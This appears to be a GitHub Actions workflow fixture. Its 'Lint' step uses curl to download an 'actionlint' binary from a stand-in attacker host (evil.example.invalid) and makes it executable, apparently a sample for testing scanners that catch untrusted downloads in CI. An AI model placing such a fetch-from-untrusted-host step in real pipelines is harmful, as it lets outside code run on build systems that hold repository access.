name: Verify
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  verify:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5.0.0
        with:
          persist-credentials: false
      - name: Lint
        run: |
          curl -sSfL -o actionlint https://evil.example.invalid/actionlint
          chmod +x actionlint
          echo "$HOME/bin" >> "$GITHUB_PATH"
      - name: Verify
        run: ./scripts/verify.sh
